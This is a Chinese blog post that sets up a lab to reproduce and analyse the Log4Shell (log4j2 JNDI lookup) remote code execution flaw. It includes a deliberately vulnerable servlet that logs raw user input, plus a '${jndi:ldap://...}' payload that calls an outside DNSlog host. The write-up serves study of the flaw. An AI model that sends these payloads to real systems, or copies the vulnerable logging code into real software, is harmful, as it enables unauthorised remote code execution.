+++
title = 'log4j2搭建复现探究'
date = '2025-02-16T15:12:14+08:00'
categories = ['Java', '学习', '安全']
tags = ['java安全', 'rce']
+++

## 前言

log4j2应该是在21年左右爆出来的漏洞，影响甚大，当时只要用了apache log4j的这个组件，那么很可能就存在潜在危险了。之前也遇见过这个漏洞，当时是直接网上一搜直接用的，今天来分析一下这个漏洞。

## 漏洞简介

Apache log4j是基于java的日志工具。开发者留了递归解析的功能，使用者可以引用配置中的属性，或传递给底层组件并动态解析，然而就在这，导致可能攻击者构造恶意请求，触发rce。

版本影响 2.0 <= Apache log4j <= 2.14.1  需要引入 log4j-api , log4j-core 两个jar

## 环境搭建

创建maven项目  pom.xml如下

```xml
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>org.example</groupId>
  <artifactId>log4j_re</artifactId>
  <packaging>war</packaging>
  <version>1.0-SNAPSHOT</version>
  <name>log4j_re Maven Webapp</name>
  <url>http://maven.apache.org</url>
  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>3.8.1</version>
      <scope>test</scope>
    </dependency>
    <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api -->
    <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-api</artifactId>
      <version>2.14.1</version>
    </dependency>
    <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core -->
    <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-core</artifactId>
      <version>2.14.1</version>
    </dependency>
    <dependency>
      <groupId>org.apache.tomcat.embed</groupId>
      <artifactId>tomcat-embed-core</artifactId>
      <version>9.0.83</version>
    </dependency>


  </dependencies>
  <build>
    <finalName>log4j_re</finalName>
  </build>
</project>

```

我们创建一个BaseServlet重写 doGet 和doPost

```java
package Servlet;

import org.apache.juli.logging.Log;
import org.apache.logging.log4j.LogManager;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.util.logging.Logger;

/**
 * @program: log4j_re
 * @description:
 * @author: 168
 * @create: 2025-02-16 12:08
 **/
public class BaseServlet extends HttpServlet {
//    private static Logger logger = LogManager.getLogger(BaseServlet.class.getName());
    public static final org.apache.logging.log4j.Logger logger = LogManager.getLogger();
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doPost(req,resp);

    }
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

//        Logger logger= LogManager.getLogger(BaseServlet.class.getName());
//        Logger logger= Logger.getLogger();
        String payload=req.getParameter("username");
        PrintWriter printWriter=resp.getWriter();
        printWriter.println("this is username:"+payload);
        logger.error(payload);
    }

}
```

web.xml

```xml
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app>
  <display-name>Archetype Created Web Application</display-name>
  <servlet>
    <servlet-name>BaseServlet</servlet-name>
    <servlet-class>Servlet.BaseServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>BaseServlet</servlet-name>
    <url-pattern>/baseServlet</url-pattern>
  </servlet-mapping>
</web-app>

```

index.jsp

```js
<html>
<body>
<h2>Hello World!</h2>
<form action ="baseServlet" method="post">
    username: <input name="username" value="" /><br>
    passwd: <input name="pwd" value="" /><br>
    <input type="submit" value="go!">
</form>
</body>
</html>

```

tomcat配置，启动项目

![image-20250216174710120](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202502161747429.png)

可以看到我们输入的`${java:version}`在控制台被执行了 输出了版本

我们换成`${jndi:ldap://85p4wv.ceye.io}`

![image-20250216174844394](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202502161748458.png)

## 代码分析

我们通常使用`LogManager.getLogger()`来获取一个`Logger`对象，然后来记录日志等信息；在所有的方法中，都会先使用`org.apache.logging.log4j.spi.AbstractLogger#logIfEnabled`的若干个重载方法来配置日志的等级，判断是否要输出或者记录。而漏洞的触发都是从`logMessage`方法开始的，如果调用了erreo/warn/info 都会触发漏洞。

log4j使用`org.apache.logging.log4j.core.pattern.MessagePatternConverter#MessagePatternConverter`来对日志信息进行处理，在实例化时会从Properties 及 Options 中来获取配置确定是否开启`Looks`功能。

![image-20250216204953984](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202502162049106.png)

默认是开启的，配置为false
![image-20250216205020689](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202502162050733.png)

在`format`方法中`replace`在对log处理过程对`${}`进行了判断，如果匹配到类似这种表达式就会触发替换机制
![image-20250216212954175](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202502162129253.png)

然后跟进会跳到`org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute()`，这个方法提取了`${}`中参数。

我们再看提供`Lookup`功能的关键处理类，`org.apache.logging.log4j.core.lookup.StrSubstitutor`；

![image-20250216212251529](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202502162122632.png)

再循环后就进入了`resolveVariable`
![image-20250216213300305](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202502162133433.png)

跟进
![image-20250216213358452](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202502162133560.png)

提取后log4j会将其作为`lookup`的参数；这里可以看到很多Lookup实现类；Log4j2 使用 `org.apache.logging.log4j.core.lookup.Interpolator` 类来代理所有的 `StrLookup` 实现类。也就是说在实际使用 Lookup 功能时，由 Interpolator 这个类来处理和分发。
![image-20250216214513144](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202502162145241.png)

对于关键字jndi处理的类为`org.apache.logging.log4j.core.lookup.JndiLookup#lookup`
![image-20250216214735531](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202502162147640.png)

使用`jndiManager.lookup`处理，跟进
![image-20250216214818584](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202502162148657.png)

可以看到已经进到原生的`lookup`解析。

## 问题处理

如果不能触发漏洞，可能是jdk版本的问题，或者其他配置的问题，这个链接有解决方案
[[main\] ERROR log4j - Reference Class Name: foo · Issue #1 · tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce/issues/1)

代码：[study/log4j_re at main · 4everwl/study](https://github.com/4everwl/study/tree/main/log4j_re)

